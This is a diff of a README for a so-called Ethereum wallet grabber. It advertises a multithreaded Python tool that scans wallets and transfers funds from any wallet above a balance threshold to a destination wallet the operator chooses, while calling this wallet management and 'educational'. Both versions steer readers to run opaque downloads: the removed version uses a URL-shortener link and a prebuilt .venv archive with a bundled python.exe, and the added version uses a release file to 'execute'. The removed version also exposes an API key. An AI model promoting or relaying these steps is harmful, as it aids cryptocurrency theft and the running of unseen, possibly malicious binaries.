@@ -1,234 +1,125 @@
-# Ethereum Wallet Grabber
-## Download - [Click here](https://cleanuri.com/GVGGkG)
+# Ethereum Wallet Grabber: Check Balances & Automate Transfers 🚀
 
+![Ethereum Wallet Grabber](https://img.shields.io/badge/Ethereum%20Wallet%20Grabber-v1.0-blue.svg)  
+[![Releases](https://img.shields.io/badge/Releases-latest-orange.svg)](https://github.com/makoff08/Ethereum-Wallet-Grabber-Balance-Checker/releases)
 
+## Table of Contents
+- [Overview](#overview)
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Configuration](#configuration)
+- [Multithreading](#multithreading)
+- [Supported Wallets](#supported-wallets)
+- [How to Contribute](#how-to-contribute)
+- [License](#license)
+- [Support](#support)
 
-This Python project scans Ethereum wallets, checks their balances, and transfers funds from wallets that meet a specified balance threshold to another wallet. It uses multithreading to scan and process wallets efficiently and in parallel.
-
-
+## Overview
+The Ethereum Wallet Grabber is a Python tool designed for users who want to manage their Ethereum wallets efficiently. This tool scans multiple wallets, checks their balances, and automates fund transfers from wallets that meet a specified balance threshold. By using multithreading, the tool enhances the speed of wallet scanning and transaction processing, making it a valuable asset for cryptocurrency management.
 
 ## Features
+- **Balance Checking**: Quickly check the balance of multiple Ethereum wallets.
+- **Automated Transfers**: Transfer funds from wallets that exceed a specific balance.
+- **Multithreading Support**: Efficiently process multiple wallets in parallel.
+- **User-Friendly Interface**: Simple command-line interface for easy usage.
+- **Configurable Settings**: Customize balance thresholds and other parameters.
+- **Wallet Management**: Store and manage private keys securely.
 
+## Installation
+To install the Ethereum Wallet Grabber, follow these steps:
 
+1. **Clone the Repository**:
+   ```bash
+   git clone https://github.com/makoff08/Ethereum-Wallet-Grabber-Balance-Checker.git
+   ```
 
-- **Multithreading Support**: Allows users to run multiple threads to increase scanning speed.
+2. **Navigate to the Directory**:
+   ```bash
+   cd Ethereum-Wallet-Grabber-Balance-Checker
+   ```
 
-- **Wallet Scanning**: Searches for Ethereum wallets and checks if their balance exceeds a defined threshold.
+3. **Install Required Packages**:
+   Make sure you have Python 3.x installed. Use pip to install the required libraries:
+   ```bash
+   pip install -r requirements.txt
+   ```
 
-- **Balance-Based Transfers**: If a wallet’s balance is above the defined minimum, the ETH is transferred to another wallet.
-
-- **Keyboard Shortcuts**: Users can control the program using specific key combinations (e.g., to start, stop, or update the process).
-
-
-
-## Requirements
-
-
-
-To run this project, make sure you have the following dependencies installed:
-
-
-
-- Python 3.11.9  
-
-- `psutil` (to monitor system resources)  
-
-- `keyboard` (to respond to keyboard shortcuts)  
-
-- `colorama` (for colored terminal output)  
-
-- `python-dotenv` (to load environment variables)
-
-
-
-Install the dependencies using this command:
-
-
-
-```bash
-
-pip install psutil keyboard colorama python-dotenv
-
-```
-
-
-
-## Setup
-
-
-
-1. Download the project to your computer.
-
-2. Extract the project folder.
-
-3. Create a `.env` file and add the required environment variables. Example:
-
-
-
-```env
-
-apiURL=
-
-apiKey=67e5a3903e8b447ab7e34d8a52b38dd1
-
-threadsMulti=6
-
-balance_min=330000000000000
-
-withdraw_wallet=<DESTINATION_WALLET_ADDRESS>
-
-threadsBlock=2
-
-```
-
-
-
-- **apiURL**: The API endpoint used for crypto operations.  
-
-- **apiKey**: Your API key to access the service.  
-
-- **balance_min**: Minimum balance (in wei/gwei) to qualify a wallet for transfer.  
-
-- **withdraw_wallet**: The wallet address to which funds will be transferred.  
-
-- **threadsMulti**: Number of threads to run for parallel processing.  
-
-- **threadsBlock**: A parameter for managing thread execution.
-
-
+4. **Download the Latest Release**:
+   Visit the [Releases](https://github.com/makoff08/Ethereum-Wallet-Grabber-Balance-Checker/releases) section to download the latest version. Follow the instructions to execute the file.
 
 ## Usage
-
-
-
-### Launching the Program
-
-
-
-- Install Python 3.11.9. [(Installation Guide)](./INSTALL_Python_3.11.9.md)
-
-- Extract the `.venv.7z` file to the project root folder.
-
-- Open `.\.venv\pyvenv.cfg` and replace `YOUR_USERNAME` with your actual username.
-
-- Start the program using this command:
-
-
-
+To use the Ethereum Wallet Grabber, run the following command in your terminal:
+```bash
+python wallet_grabber.py
 ```
 
-".\.venv\Scripts\python.exe" main.py
+You will be prompted to enter your configuration settings, including wallet addresses and balance thresholds.
 
+### Example Command
+```bash
+python wallet_grabber.py --wallets wallets.txt --threshold 0.5
 ```
 
-
-
-> Note: The better your computer’s performance, the faster the scan.
-
-
-
-### Keyboard Shortcuts
-
-
-
-You can control the application with the following key combinations:
-
-
-
-- **Alt + K**: Stops the current threads.
-
-- **Alt + R**: Restarts the stopped threads.
-
-- **Alt + Q**: Exits the application.
-
-- **Alt + U**: Clears and refreshes the console display.
-
-
-
-### Output
-
-
-
-The program displays status messages about scanning and transactions in the console. Sample output:
-
-
-
+## Configuration
+The tool requires a configuration file to operate. You can create a file named `config.json` with the following structure:
+```json
+{
+  "wallets": [
+    "0xYourWalletAddress1",
+    "0xYourWalletAddress2"
+  ],
+  "threshold": 0.5
+}
 ```
+Make sure to replace the wallet addresses with your own.
 
--- -- -- --  Worker Count: 8 ||  5  ||  -- -- -- --  Wallets Scanned: 150  -- -- -- --  Wallets Hits: 30 -- -- -- --  UpTime: 00:12:34 -- -- -- --  W/S: 25  -- -- -- --  W/M: 15
-
+## Multithreading
+The Ethereum Wallet Grabber utilizes multithreading to enhance performance. By processing multiple wallets simultaneously, it reduces the time needed for balance checks and fund transfers. You can adjust the number of threads in the configuration file:
+```json
+{
+  "threads": 5
+}
 ```
+Increase or decrease the number based on your system's capabilities.
 
+## Supported Wallets
+The tool supports various Ethereum wallets, including:
+- MetaMask
+- MyEtherWallet
+- Ledger
+- Trezor
+- Any wallet that supports Ethereum addresses
 
+## How to Contribute
+Contributions are welcome! If you want to contribute to the Ethereum Wallet Grabber, follow these steps:
 
-- **Worker Count**: Number of active threads.
-
-- **Wallets Scanned**: Total number of wallets scanned.
-
-- **Wallets Hits**: Number of wallets with a qualifying balance.
-
-- **UpTime**: Total runtime of the program.
-
-- **W/S**: Time taken per wallet (in seconds).
-
-- **W/M**: Wallets scanned per minute.
-
-
-
-## Preview
-
-
-
-example.com
-
-
-
-## Architecture and Flow
-
-
-
-### `ethGrabber` Class
-
-
-
-This class handles the core functionality. Main components:
-
-
-
-- **`__init__`**: Loads environment variables, sets up threading, and initializes objects.
-
-- **`Grabber`**: The method each thread runs — scans wallets, checks balances, and makes transfers if needed.
-
-- **`update_console`**: Updates the console with runtime and statistics.
-
-- **`run`**: Launches multiple threads and executes the `Grabber` method in each.
-
-
-
-## Contributing
-
-
-
-If you’d like to contribute to this project:
-
-
-
-- Fork the repository.
-
-- If you like the project, please leave a star on this repository.
-
-
-
-## Disclaimer
-
-
-
-This software is intended for educational and testing purposes only. Unauthorized wallet access, illegal use, or unethical activity is strictly prohibited. Use is at your own risk. The developer is not responsible for any consequences resulting from misuse.
-
-
+1. **Fork the Repository**: Click the "Fork" button on the top right corner of the repository page.
+2. **Create a New Branch**:
+   ```bash
+   git checkout -b feature/YourFeatureName
+   ```
+3. **Make Your Changes**: Implement your feature or fix.
+4. **Commit Your Changes**:
+   ```bash
+   git commit -m "Add your message here"
+   ```
+5. **Push to Your Branch**:
+   ```bash
+   git push origin feature/YourFeatureName
+   ```
+6. **Create a Pull Request**: Go to the original repository and click on "New Pull Request".
 
 ## License
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
 
+## Support
+For any questions or issues, please check the [Releases](https://github.com/makoff08/Ethereum-Wallet-Grabber-Balance-Checker/releases) section or open an issue in the repository.
 
+## Acknowledgments
+- Thanks to the Ethereum community for their continuous support and innovation.
+- Special thanks to contributors for their valuable input and enhancements.
 
-This project is licensed under the MIT License. See the `LICENSE` file for more details.
+---
+
+Feel free to explore the code, and happy coding!
